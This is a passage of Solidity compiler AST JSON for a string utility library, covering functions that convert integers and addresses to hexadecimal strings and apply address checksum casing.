\"0\""},"value":"0"},"src":"2805:15:3","typeDescriptions":{"typeIdentifier":"t_bytes1","typeString":"bytes1"}},"id":419,"nodeType":"ExpressionStatement","src":"2805:15:3"},{"expression":{"id":424,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftHandSide":{"baseExpression":{"id":420,"name":"buffer","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":404,"src":"2830:6:3","typeDescriptions":{"typeIdentifier":"t_bytes_memory_ptr","typeString":"bytes memory"}},"id":422,"indexExpression":{"hexValue":"31","id":421,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"2837:1:3","typeDescriptions":{"typeIdentifier":"t_rational_1_by_1","typeString":"int_const 1"},"value":"1"},"isConstant":false,"isLValue":true,"isPure":false,"lValueRequested":true,"nodeType":"IndexAccess","src":"2830:9:3","typeDescriptions":{"typeIdentifier":"t_bytes1","typeString":"bytes1"}},"nodeType":"Assignment","operator":"=","rightHandSide":{"hexValue":"78","id":423,"isConstant":false,"isLValue":false,"isPure":true,"kind":"string","lValueRequested":false,"nodeType":"Literal","src":"2842:3:3","typeDescriptions":{"typeIdentifier":"t_stringliteral_7521d1cadbcfa91eec65aa16715b94ffc1c9654ba57ea2ef1a2127bca1127a83","typeString":"literal_string \"x\""},"value":"x"},"src":"2830:15:3","typeDescriptions":{"typeIdentifier":"t_bytes1","typeString":"bytes1"}},"id":425,"nodeType":"ExpressionStatement","src":"2830:15:3"},{"body":{"id":454,"nodeType":"Block","src":"2900:95:3","statements":[{"expression":{"id":448,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftHandSide":{"baseExpression":{"id":440,"name":"buffer","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":404,"src":"2914:6:3","typeDescriptions":{"typeIdentifier":"t_bytes_memory_ptr","typeString":"bytes memory"}},"id":442,"indexExpression":{"id":441,"name":"i","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":427,"src":"2921:1:3","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"isConstant":false,"isLValue":true,"isPure":false,"lValueRequested":true,"nodeType":"IndexAccess","src":"2914:9:3","typeDescriptions":{"typeIdentifier":"t_bytes1","typeString":"bytes1"}},"nodeType":"Assignment","operator":"=","rightHandSide":{"baseExpression":{"id":443,"name":"HEX_DIGITS","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":243,"src":"2926:10:3","typeDescriptions":{"typeIdentifier":"t_bytes16","typeString":"bytes16"}},"id":447,"indexExpression":{"commonType":{"typeIdentifier":"t_uint256","typeString":"uint256"},"id":446,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"id":444,"name":"localValue","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":400,"src":"2937:10:3","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"BinaryOperation","operator":"&","rightExpression":{"hexValue":"307866","id":445,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"2950:3:3","typeDescriptions":{"typeIdentifier":"t_rational_15_by_1","typeString":"int_const 15"},"value":"0xf"},"src":"2937:16:3","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"nodeType":"IndexAccess","src":"2926:28:3","typeDescriptions":{"typeIdentifier":"t_bytes1","typeString":"bytes1"}},"src":"2914:40:3","typeDescriptions":{"typeIdentifier":"t_bytes1","typeString":"bytes1"}},"id":449,"nodeType":"ExpressionStatement","src":"2914:40:3"},{"expression":{"id":452,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftHandSide":{"id":450,"name":"localValue","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":400,"src":"2968:10:3","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"Assignment","operator":">>=","rightHandSide":{"hexValue":"34","id":451,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"2983:1:3","typeDescriptions":{"typeIdentifier":"t_rational_4_by_1","typeString":"int_const 4"},"value":"4"},"src":"2968:16:3","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"id":453,"nodeType":"ExpressionStatement","src":"2968:16:3"}]},"condition":{"commonType":{"typeIdentifier":"t_uint256","typeString":"uint256"},"id":436,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"id":434,"name":"i","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":427,"src":"2888:1:3","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"BinaryOperation","operator":">","rightExpression":{"hexValue":"31","id":435,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"2892:1:3","typeDescriptions":{"typeIdentifier":"t_rational_1_by_1","typeString":"int_const 1"},"value":"1"},"src":"2888:5:3","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}},"id":455,"initializationExpression":{"assignments":[427],"declarations":[{"constant":false,"id":427,"mutability":"mutable","name":"i","nameLocation":"2868:1:3","nodeType":"VariableDeclaration","scope":455,"src":"2860:9:3","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"},"typeName":{"id":426,"name":"uint256","nodeType":"ElementaryTypeName","src":"2860:7:3","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"visibility":"internal"}],"id":433,"initialValue":{"commonType":{"typeIdentifier":"t_uint256","typeString":"uint256"},"id":432,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"commonType":{"typeIdentifier":"t_uint256","typeString":"uint256"},"id":430,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"hexValue":"32","id":428,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"2872:1:3","typeDescriptions":{"typeIdentifier":"t_rational_2_by_1","typeString":"int_const 2"},"value":"2"},"nodeType":"BinaryOperation","operator":"*","rightExpression":{"id":429,"name":"length","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":394,"src":"2876:6:3","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"src":"2872:10:3","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"BinaryOperation","operator":"+","rightExpression":{"hexValue":"31","id":431,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"2885:1:3","typeDescriptions":{"typeIdentifier":"t_rational_1_by_1","typeString":"int_const 1"},"value":"1"},"src":"2872:14:3","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"VariableDeclarationStatement","src":"2860:26:3"},"isSimpleCounterLoop":false,"loopExpression":{"expression":{"id":438,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"nodeType":"UnaryOperation","operator":"--","prefix":true,"src":"2895:3:3","subExpression":{"id":437,"name":"i","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":427,"src":"2897:1:3","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"id":439,"nodeType":"ExpressionStatement","src":"2895:3:3"},"nodeType":"ForStatement","src":"2855:140:3"},{"condition":{"commonType":{"typeIdentifier":"t_uint256","typeString":"uint256"},"id":458,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"id":456,"name":"localValue","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":400,"src":"3008:10:3","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"BinaryOperation","operator":"!=","rightExpression":{"hexValue":"30","id":457,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"3022:1:3","typeDescriptions":{"typeIdentifier":"t_rational_0_by_1","typeString":"int_const 0"},"value":"0"},"src":"3008:15:3","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}},"id":465,"nodeType":"IfStatement","src":"3004:96:3","trueBody":{"id":464,"nodeType":"Block","src":"3025:75:3","statements":[{"errorCall":{"arguments":[{"id":460,"name":"value","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":392,"src":"3075:5:3","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},{"id":461,"name":"length","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":394,"src":"3082:6:3","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_uint256","typeString":"uint256"},{"typeIdentifier":"t_uint256","typeString":"uint256"}],"id":459,"name":"StringsInsufficientHexLength","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":289,"src":"3046:28:3","typeDescriptions":{"typeIdentifier":"t_function_error_pure$_t_uint256_$_t_uint256_$returns$_t_error_$","typeString":"function (uint256,uint256) pure returns (error)"}},"id":462,"isConstant":false,"isLValue":false,"isPure":false,"kind":"functionCall","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"3046:43:3","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_error","typeString":"error"}},"id":463,"nodeType":"RevertStatement","src":"3039:50:3"}]}},{"expression":{"arguments":[{"id":468,"name":"buffer","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":404,"src":"3123:6:3","typeDescriptions":{"typeIdentifier":"t_bytes_memory_ptr","typeString":"bytes memory"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_bytes_memory_ptr","typeString":"bytes memory"}],"id":467,"isConstant":false,"isLValue":false,"isPure":true,"lValueRequested":false,"nodeType":"ElementaryTypeNameExpression","src":"3116:6:3","typeDescriptions":{"typeIdentifier":"t_type$_t_string_storage_ptr_$","typeString":"type(string storage pointer)"},"typeName":{"id":466,"name":"string","nodeType":"ElementaryTypeName","src":"3116:6:3","typeDescriptions":{}}},"id":469,"isConstant":false,"isLValue":false,"isPure":false,"kind":"typeConversion","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"3116:14:3","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_string_memory_ptr","typeString":"string memory"}},"functionReturnParameters":398,"id":470,"nodeType":"Return","src":"3109:21:3"}]},"documentation":{"id":390,"nodeType":"StructuredDocumentation","src":"2495:112:3","text":" @dev Converts a `uint256` to its ASCII `string` hexadecimal representation with fixed length."},"id":472,"implemented":true,"kind":"function","modifiers":[],"name":"toHexString","nameLocation":"2621:11:3","nodeType":"FunctionDefinition","parameters":{"id":395,"nodeType":"ParameterList","parameters":[{"constant":false,"id":392,"mutability":"mutable","name":"value","nameLocation":"2641:5:3","nodeType":"VariableDeclaration","scope":472,"src":"2633:13:3","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"},"typeName":{"id":391,"name":"uint256","nodeType":"ElementaryTypeName","src":"2633:7:3","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"visibility":"internal"},{"constant":false,"id":394,"mutability":"mutable","name":"length","nameLocation":"2656:6:3","nodeType":"VariableDeclaration","scope":472,"src":"2648:14:3","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"},"typeName":{"id":393,"name":"uint256","nodeType":"ElementaryTypeName","src":"2648:7:3","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"visibility":"internal"}],"src":"2632:31:3"},"returnParameters":{"id":398,"nodeType":"ParameterList","parameters":[{"constant":false,"id":397,"mutability":"mutable","name":"","nameLocation":"-1:-1:-1","nodeType":"VariableDeclaration","scope":472,"src":"2687:13:3","stateVariable":false,"storageLocation":"memory","typeDescriptions":{"typeIdentifier":"t_string_memory_ptr","typeString":"string"},"typeName":{"id":396,"name":"string","nodeType":"ElementaryTypeName","src":"2687:6:3","typeDescriptions":{"typeIdentifier":"t_string_storage_ptr","typeString":"string"}},"visibility":"internal"}],"src":"2686:15:3"},"scope":1631,"src":"2612:525:3","stateMutability":"pure","virtual":false,"visibility":"internal"},{"body":{"id":491,"nodeType":"Block","src":"3369:75:3","statements":[{"expression":{"arguments":[{"arguments":[{"arguments":[{"id":485,"name":"addr","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":475,"src":"3414:4:3","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_address","typeString":"address"}],"id":484,"isConstant":false,"isLValue":false,"isPure":true,"lValueRequested":false,"nodeType":"ElementaryTypeNameExpression","src":"3406:7:3","typeDescriptions":{"typeIdentifier":"t_type$_t_uint160_$","typeString":"type(uint160)"},"typeName":{"id":483,"name":"uint160","nodeType":"ElementaryTypeName","src":"3406:7:3","typeDescriptions":{}}},"id":486,"isConstant":false,"isLValue":false,"isPure":false,"kind":"typeConversion","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"3406:13:3","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_uint160","typeString":"uint160"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_uint160","typeString":"uint160"}],"id":482,"isConstant":false,"isLValue":false,"isPure":true,"lValueRequested":false,"nodeType":"ElementaryTypeNameExpression","src":"3398:7:3","typeDescriptions":{"typeIdentifier":"t_type$_t_uint256_$","typeString":"type(uint256)"},"typeName":{"id":481,"name":"uint256","nodeType":"ElementaryTypeName","src":"3398:7:3","typeDescriptions":{}}},"id":487,"isConstant":false,"isLValue":false,"isPure":false,"kind":"typeConversion","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"3398:22:3","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},{"id":488,"name":"ADDRESS_LENGTH","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":246,"src":"3422:14:3","typeDescriptions":{"typeIdentifier":"t_uint8","typeString":"uint8"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_uint256","typeString":"uint256"},{"typeIdentifier":"t_uint8","typeString":"uint8"}],"id":480,"name":"toHexString","nodeType":"Identifier","overloadedDeclarations":[389,472,492],"referencedDeclaration":472,"src":"3386:11:3","typeDescriptions":{"typeIdentifier":"t_function_internal_pure$_t_uint256_$_t_uint256_$returns$_t_string_memory_ptr_$","typeString":"function (uint256,uint256) pure returns (string memory)"}},"id":489,"isConstant":false,"isLValue":false,"isPure":false,"kind":"functionCall","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"3386:51:3","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_string_memory_ptr","typeString":"string memory"}},"functionReturnParameters":479,"id":490,"nodeType":"Return","src":"3379:58:3"}]},"documentation":{"id":473,"nodeType":"StructuredDocumentation","src":"3143:148:3","text":" @dev Converts an `address` with fixed length of 20 bytes to its not checksummed ASCII `string` hexadecimal\n representation."},"id":492,"implemented":true,"kind":"function","modifiers":[],"name":"toHexString","nameLocation":"3305:11:3","nodeType":"FunctionDefinition","parameters":{"id":476,"nodeType":"ParameterList","parameters":[{"constant":false,"id":475,"mutability":"mutable","name":"addr","nameLocation":"3325:4:3","nodeType":"VariableDeclaration","scope":492,"src":"3317:12:3","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"},"typeName":{"id":474,"name":"address","nodeType":"ElementaryTypeName","src":"3317:7:3","stateMutability":"nonpayable","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},"visibility":"internal"}],"src":"3316:14:3"},"returnParameters":{"id":479,"nodeType":"ParameterList","parameters":[{"constant":false,"id":478,"mutability":"mutable","name":"","nameLocation":"-1:-1:-1","nodeType":"VariableDeclaration","scope":492,"src":"3354:13:3","stateVariable":false,"storageLocation":"memory","typeDescriptions":{"typeIdentifier":"t_string_memory_ptr","typeString":"string"},"typeName":{"id":477,"name":"string","nodeType":"ElementaryTypeName","src":"3354:6:3","typeDescriptions":{"typeIdentifier":"t_string_storage_ptr","typeString":"string"}},"visibility":"internal"}],"src":"3353:15:3"},"scope":1631,"src":"3296:148:3","stateMutability":"pure","virtual":false,"visibility":"internal"},{"body":{"id":556,"nodeType":"Block","src":"3701:642:3","statements":[{"assignments":[501],"declarations":[{"constant":false,"id":501,"mutability":"mutable","name":"buffer","nameLocation":"3724:6:3","nodeType":"VariableDeclaration","scope":556,"src":"3711:19:3","stateVariable":false,"storageLocation":"memory","typeDescriptions":{"typeIdentifier":"t_bytes_memory_ptr","typeString":"bytes"},"typeName":{"id":500,"name":"bytes","nodeType":"ElementaryTypeName","src":"3711:5:3","typeDescriptions":{"typeIdentifier":"t_bytes_storage_ptr","typeString":"bytes"}},"visibility":"internal"}],"id":508,"initialValue":{"arguments":[{"arguments":[{"id":505,"name":"addr","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":495,"src":"3751:4:3","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_address","typeString":"address"}],"id":504,"name":"toHexString","nodeType":"Identifier","overloadedDeclarations":[389,472,492],"referencedDeclaration":492,"src":"3739:11:3","typeDescriptions":{"typeIdentifier":"t_function_internal_pure$_t_address_$returns$_t_string_memory_ptr_$","typeString":"function (address) pure returns (string memory)"}},"id":506,"isConstant":false,"isLValue":false,"isPure":false,"kind":"functionCall","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"3739:17:3","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_string_memory_ptr","typeString":"string memory"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_string_memory_ptr","typeString":"string memory"}],"id":503,"isConstant":false,"isLValue":false,"isPure":true,"lValueRequested":false,"nodeType":"ElementaryTypeNameExpression","src":"3733:5:3","typeDescriptions":{"typeIdentifier":"t_type$_t_bytes_storage_ptr_$","typeString":"type(bytes storage pointer)"},"typeName":{"id":502,"name":"bytes","nodeType":"ElementaryTypeName","src":"3733:5:3","typeDescriptions":{}}},"id":507,"isConstant":false,"isLValue":false,"isPure":false,"kind":"typeConversion","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"3733:24:3","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_bytes_memory_ptr","typeString":"bytes memory"}},"nodeType":"VariableDeclarationStatement","src":"3711:46:3"},{"assignments":[510],"declarations":[{"constant":false,"id":510,"mutability":"mutable","name":"hashValue","nameLocation":"3850:9:3","nodeType":"VariableDeclaration","scope":556,"src":"3842:17:3","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"},"typeName":{"id":509,"name":"uint256","nodeType":"ElementaryTypeName","src":"3842:7:3","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"visibility":"internal"}],"id":511,"nodeType":"VariableDeclarationStatement","src":"3842:17:3"},{"AST":{"nativeSrc":"3894:78:3","nodeType":"YulBlock","src":"3894:78:3","statements":[{"nativeSrc":"3908:54:3","nodeType":"YulAssignment","src":"3908:54:3","value":{"arguments":[{"kind":"number","nativeSrc":"3925:2:3","nodeType":"YulLiteral","src":"3925:2:3","type":"","value":"96"},{"arguments":[{"arguments":[{"name":"buffer","nativeSrc":"3943:6:3","nodeType":"YulIdentifier","src":"3943:6:3"},{"kind":"number","nativeSrc":"3951:4:3","nodeType":"YulLiteral","src":"3951:4:3","type":"","value":"0x22"}],"functionName":{"name":"add","nativeSrc":"3939:3:3","nodeType":"YulIdentifier","src":"3939:3:3"},"nativeSrc":"3939:17:3","nodeType":"YulFunctionCall","src":"3939:17:3"},{"kind":"number","nativeSrc":"3958:2:3","nodeType":"YulLiteral","src":"3958:2:3","type":"","value":"40"}],"functionName":{"name":"keccak256","nativeSrc":"3929:9:3","nodeType":"YulIdentifier","src":"3929:9:3"},"nativeSrc":"3929:32:3","nodeType":"YulFunctionCall","src":"3929:32:3"}],"functionName":{"name":"shr","nativeSrc":"3921:3:3","nodeType":"YulIdentifier","src":"3921:3:3"},"nativeSrc":"3921:41:3","nodeType":"YulFunctionCall","src":"3921:41:3"},"variableNames":[{"name":"hashValue","nativeSrc":"3908:9:3","nodeType":"YulIdentifier","src":"3908:9:3"}]}]},"evmVersion":"paris","externalReferences":[{"declaration":501,"isOffset":false,"isSlot":false,"src":"3943:6:3","valueSize":1},{"declaration":510,"isOffset":false,"isSlot":false,"src":"3908:9:3","valueSize":1}],"flags":["memory-safe"],"id":512,"nodeType":"InlineAssembly","src":"3869:103:3"},{"body":{"id":549,"nodeType":"Block","src":"4015:291:3","statements":[{"condition":{"commonType":{"typeIdentifier":"t_bool","typeString":"bool"},"id":536,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"commonType":{"typeIdentifier":"t_uint256","typeString":"uint256"},"id":527,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"commonType":{"typeIdentifier":"t_uint256","typeString":"uint256"},"id":525,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"id":523,"name":"hashValue","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":510,"src":"4121:9:3","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"BinaryOperation","operator":"&","rightExpression":{"hexValue":"307866","id":524,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"4133:3:3","typeDescriptions":{"typeIdentifier":"t_rational_15_by_1","typeString":"int_const 15"},"value":"0xf"},"src":"4121:15:3","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"BinaryOperation","operator":">","rightExpression":{"hexValue":"37","id":526,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"4139:1:3","typeDescriptions":{"typeIdentifier":"t_rational_7_by_1","typeString":"int_const 7"},"value":"7"},"src":"4121:19:3","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}},"nodeType":"BinaryOperation","operator":"&&","rightExpression":{"commonType":{"typeIdentifier":"t_uint8","typeString":"uint8"},"id":535,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"arguments":[{"baseExpression":{"id":530,"name":"buffer","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":501,"src":"4150:6:3","typeDescriptions":{"typeIdentifier":"t_bytes_memory_ptr","typeString":"bytes memory"}},"id":532,"indexExpression":{"id":531,"name":"i","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":514,"src":"4157:1:3","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"isConstant":false,"isLValue":true,"isPure":false,"lValueRequested":false,"nodeType":"IndexAccess","src":"4150:9:3","typeDescriptions":{"typeIdentifier":"t_bytes1","typeString":"bytes1"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_bytes1","typeString":"bytes1"}],"id":529,"isConstant":false,"isLValue":false,"isPure":true,"lValueRequested":false,"nodeType":"ElementaryTypeNameExpression","src":"4144:5:3","typeDescriptions":{"typeIdentifier":"t_type$_t_uint8_$","typeString":"type(uint8)"},"typeName":{"id":528,"name":"uint8","nodeType":"ElementaryTypeName","src":"4144:5:3","typeDescriptions":{}}},"id":533,"isConstant":false,"isLValue":false,"isPure":false,"kind":"typeConversion","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"4144:16:3","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_uint8","typeString":"uint8"}},"nodeType":"BinaryOperation","operator":">","rightExpression":{"hexValue":"3936","id":534,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"4163:2:3","typeDescriptions":{"typeIdentifier":"t_rational_96_by_1","typeString":"int_const 96"},"value":"96"},"src":"4144:21:3","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}},"src":"4121:44:3","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}},"id":544,"nodeType":"IfStatement","src":"4117:150:3","trueBody":{"id":543,"nodeType":"Block","src":"4167:100:3","statements":[{"expression":{"id":541,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftHandSide":{"baseExpression":{"id":537,"name":"buffer","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":501,"src":"4235:6:3","typeDescriptions":{"typeIdentifier":"t_bytes_memory_ptr","typeString":"bytes memory"}},"id":539,"indexExpression":{"id":538,"name":"i","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":514,"src":"4242:1:3","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"isConstant":false,"isLValue":true,"isPure":false,"lValueRequested":true,"nodeType":"IndexAccess","src":"4235:9:3","typeDescriptions":{"typeIdentifier":"t_bytes1","typeString":"bytes1"}},"nodeType":"Assignment","operator":"^=","rightHandSide":{"hexValue":"30783230","id":540,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"4248:4:3","typeDescriptions":{"typeIdentifier":"t_rational_32_by_1","typeString":"int_const 32"},"value":"0x20"},"src":"4235:17:3","typeDescriptions":{"typeIdentifier":"t_bytes1","typeString":"bytes1"}},"id":542,"nodeType":"ExpressionStatement","src":"4235:17:3"}]}},{"expression":{"id":547,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftHandSide":{"id":545,"name":"hashValue","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":510,"src":"4280:9:3","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"Assignment","operator":">>=","rightHandSide":{"hexValue":"34","id":546,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"4294:1:3","typeDescriptions":{"typeIdentifier":"t_rational_4_by_1","typeString":"int_const 4"},"value":"4"},"src":"4280:15:3","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"id":548,"nodeType":"ExpressionStatement","src":"4280:15:3"}]},"condition":{"commonType":{"typeIdentifier":"t_uint256","typeString":"uint256"},"id":519,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"id":517,"name":"i","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":514,"src":"4003:1:3","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"BinaryOperation","operator":">","rightExpression":{"hexValue":"31","id":518,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"4007:1:3","typeDescriptions":{"typeIdentifier":"t_rational_1_by_1","typeString":"int_const 1"},"value":"1"},"src":"4003:5:3","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}},"id":550,"initializationExpression":{"assignments":[514],"declarations":[{"constant":false,"id":514,"mutability":"mutable","name":"i","nameLocation":"3995:1:3","nodeType":"VariableDeclaration","scope":550,"src":"3987:9:3","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"},"typeName":{"id":513,"name":"uint256","nodeType":"ElementaryTypeName","src":"3987:7:3","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"visibility":"internal"}],"id":516,"initialValue":{"hexValue":"3431","id":515,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"3999:2:3","typeDescriptions":{"typeIdentifier":"t_rational_41_by_1","typeString":"int_const 41"},"value":"41"},"nodeType":"VariableDeclarationStatement","src":"3987:14:3"},"isSimpleCounterLoop":false,"loopExpression":{"expression":{"id":521,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"nodeType":"UnaryOperation","operator":"--","prefix":true,"src":"4010:3:3","subExpression":{"id":520,"name":"i","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":514,"src":"4012:1:3","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"id":522,"nodeType":"ExpressionStatement","src":"4010:3:3"},"nodeType":"ForStatement","src":"3982:324:3"},{"expression":{"arguments":[{"id":553,"name":"buffer","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":501,"src":"4329:6:3","typeDescriptions":{"typeIdentifier":"t_bytes_memory_ptr","typeString":"bytes memory"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_bytes_memory_ptr","typeString":"bytes memory"}],"id":552,"isConstant":false,"isLValue":false,"isPure":true,"lValueRequested":false,"nodeType":"ElementaryTypeNameExpression","src":"4322:6:3","typeDescriptions":{"typeIdentifier":"t_type$_t_string_storage_ptr_$","typeString":"type(string storage pointer)"},"typeName":{"id":551,"name":"string","nodeType":"ElementaryTypeName","src":"4322:6:3","typeDescriptions":{}}},"id":554,"isConstant":false,"isLValue":false,"isPure":false,"kind":"typeConversion","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"4322:14:3","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_string_memory_ptr","typeString":"string 